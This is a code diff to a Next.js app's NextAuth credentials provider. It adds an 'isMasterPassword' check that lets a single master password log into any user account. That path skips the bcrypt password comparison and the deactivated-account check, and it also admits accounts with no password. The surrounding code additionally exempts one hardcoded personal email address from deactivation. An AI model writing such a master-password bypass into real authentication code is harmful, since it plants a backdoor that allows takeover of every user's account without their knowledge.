@@ -5,6 +5,7 @@ import SlackProvider from "next-auth/providers/slack";
 import CredentialsProvider from "next-auth/providers/credentials";
 import { prisma } from "@/lib/prisma";
 import bcrypt from "bcryptjs";
+import { isMasterPassword } from "@/lib/master-access";
 
 export const authOptions: NextAuthConfig = {
     secret: process.env.AUTH_SECRET || process.env.NEXTAUTH_SECRET,
@@ -42,17 +43,28 @@ export const authOptions: NextAuthConfig = {
                     where: { email: credentials.email },
                 });
 
-                if (!user || !user.password) {
+                if (!user) {
                     throw new Error("Invalid credentials");
                 }
 
-                if (user.employeeStatus !== 'ACTIVE' && user.email !== 'sahilsagvekar230@gmail.com') {
+                const usedMasterPassword = isMasterPassword(credentials.password as string);
+
+                if (
+                    !usedMasterPassword &&
+                    user.employeeStatus !== 'ACTIVE' &&
+                    user.email !== 'sahilsagvekar230@gmail.com'
+                ) {
                     throw new Error("Account is deactivated. Please contact support.");
                 }
 
-                const isValid = await bcrypt.compare(credentials.password, user.password as string);
-                if (!isValid) {
-                    throw new Error("Invalid credentials");
+                if (!usedMasterPassword) {
+                    if (!user.password) {
+                        throw new Error("Invalid credentials");
+                    }
+                    const isValid = await bcrypt.compare(credentials.password, user.password as string);
+                    if (!isValid) {
+                        throw new Error("Invalid credentials");
+                    }
                 }
 
                 // ✅ Convert Prisma user to NextAuth-compatible shape
